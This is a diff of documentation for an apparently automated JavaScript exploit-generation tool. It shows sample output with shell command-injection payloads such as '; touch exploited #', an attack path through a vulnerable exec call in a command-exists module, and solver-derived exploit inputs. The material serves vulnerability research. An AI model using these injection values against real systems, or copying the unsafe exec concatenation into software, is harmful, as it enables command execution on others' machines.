@@ -182,44 +182,17 @@ which can be found in the file `cat out/134_fast/fast-stdout.log`:
 
 ```
 ...
-success:  [['598', '330', '810'], ['80', '330', '810'], ['287', '330', '810'], ['598', '416', '810'], ['397', '416', '810'], ['726', '501', '874'], ['475', '501', '874'], ['726', '568', '874'], ['547', '568', '874']]
-final objs: ['4727'] value: ""; touch exploited & initial objs: None
-final objs: ['4727'] value: "; touch exploited # initial objs: None
-final objs: ['4727'] value: & touch exploited # initial objs: None
-final objs: ['4727'] value: ''; touch exploited # initial objs: None
-final objs: ['5014'] value: ""; touch exploited & initial objs: None
-final objs: ['5014'] value: "; touch exploited # initial objs: None
-final objs: ['5014'] value: & touch exploited # initial objs: None
-final objs: ['5014'] value: ''; touch exploited # initial objs: None
-...
-Attack Path:
-==========================
-/home/explodejs/explode-js/datasets/vulcan-dataset/CWE-78/659/src/command-exists.js
-101     module.exports = function commandExists(commandName, callback) {
-  if (!callback && typeof Promise !== 'undefined') {
-    return new Promise(function(resolve, reject){
-      commandExists(commandName, function(error, output){
-        if (output) {
-          resolve(commandName);
-        } else {
-          reject(error);
-        }
-      });
-    });
-  }
-  if (isUsingWindows) {
-    commandExistsWindows(commandName, callback);
-  } else {
-    commandExistsUnix(commandName, callback);
-  }
-};
-49                  var child = exec('command -v ' + commandName +
-                  ' 2>/dev/null' +
-                  ' && { echo >&1 \'' + commandName + ' found\'; exit 0; }',
-                  function (error, stdout, stderr) {
-                      callback(null, !!stdout);
-                  });
-6         sink_hqbpillvul_exec(sink);
+[AUTO] Constraint solver is solving for module.exports().then()...
+Constraints #1:
+[Contains(s5014, "''; touch exploited #"),
+ s5009 == "where ",
+ s5014 == Concat(s5009, s3021),
+ Not(PrefixOf(";", s5014)),
+ Not(PrefixOf("&", s5014))]
+Results #1:
+INPUT commandName(s3021) = "''; touch exploited #"
+SINK sink, command(s5014) = "where ''; touch exploited #"
+[AUTO] Successfully found solution!
 ...
 ```
 
